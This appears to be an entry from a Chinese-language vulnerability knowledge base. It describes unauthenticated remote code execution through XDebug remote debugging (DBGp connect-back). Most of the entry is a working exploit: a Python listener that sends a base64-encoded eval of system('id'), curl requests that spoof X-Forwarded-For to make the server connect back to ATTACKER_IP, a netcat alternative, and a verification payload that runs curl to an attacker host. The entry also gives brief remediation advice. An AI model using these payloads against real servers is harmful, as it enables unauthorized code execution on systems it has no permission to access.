---
id: PHP-XDEBUG-RCE
title: PHP XDebug远程调试导致代码执行漏洞
product: php
vendor: XDebug
version_affected: "2.x<=2.5.5, 3.x<=3.1.6"
severity: HIGH
tags: [rce, 无需认证]
fingerprint: ["PHP", "XDebug"]
---

## 漏洞描述

XDebug是一个用于调试PHP代码的扩展。当启用远程调试模式并设置适当的配置时，攻击者可以通过利用调试协议(DBGp)在目标服务器上执行任意PHP代码。

对于XDebug 2.x：`xdebug.remote_connect_back = 1` 且 `xdebug.remote_enable = 1`
对于XDebug 3.x：`xdebug.mode = debug` 且 `xdebug.discover_client_host = 1`

## 影响版本

- XDebug 2.x <= 2.5.5
- XDebug 3.x <= 3.1.6

## 前置条件

- 无需认证
- XDebug 远程调试功能开启且可回连攻击机

## 利用步骤

1. 在攻击机上启动 DBGp 监听器
2. 发送 HTTP 请求触发 XDebug 回连（带 XDEBUG_SESSION cookie）
3. XDebug 连接到攻击机后，通过 DBGp 协议发送 eval 命令执行 PHP 代码

## Payload

```bash
# 1. 启动 DBGp 监听器并自动执行命令（内联 Python）
# 在攻击机运行：
python3 -c "
import socket, sys

# 监听 DBGp 连接（XDebug 2.x 默认端口 9000，3.x 默认 9003）
PORT = 9000
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT))
s.listen(1)
print(f'[*] Listening on port {PORT}...')

conn, addr = s.accept()
print(f'[+] Connection from {addr}')

# 读取初始化包
data = conn.recv(4096)
print(f'[*] Init: {data[:200]}')

# 发送 eval 命令执行 PHP 代码
cmd = 'eval -i 1 -- ' + __import__('base64').b64encode(b'system(\"id\");').decode()
conn.send((cmd + '\x00').encode())
resp = conn.recv(4096)
print(f'[+] Response: {resp.decode(errors=\"ignore\")}')

conn.close()
s.close()
" &

# 2. 触发 XDebug 回连（在另一个终端执行）
# XDebug 2.x
curl -s "http://target:8080/index.php?XDEBUG_SESSION_START=phpstorm" \
  -H "X-Forwarded-For: ATTACKER_IP"

# XDebug 3.x
curl -s "http://target:8080/index.php" \
  -b "XDEBUG_SESSION=1" \
  -H "X-Forwarded-For: ATTACKER_IP"

# 3. 替代方案 — 使用 netcat + 手动 DBGp 命令
nc -lvp 9000
# 等待连接后手动输入：
# eval -i 1 -- c3lzdGVtKCJpZCIpOw==
# (base64 of: system("id");)
```

## 验证方法

```bash
# 确认 XDebug 开启 — 检查 phpinfo 中的 xdebug 配置
curl -s "http://target:8080/index.php" | grep -i "xdebug"

# RCE 验证 — DBGp 监听器收到连接后执行 eval 命令
# 上述 Python 脚本会打印 [+] Response: 包含命令输出（如 uid=... ）

# 或使用回连验证
# eval payload 改为: system("curl http://ATTACKER_IP:8888/xdebug_rce");
```

## 修复建议

1. 关闭 XDebug 远程调试功能
2. 使用 xdebug.mode=off 禁用调试
3. 配置防火墙限制 XDebug 端口访问
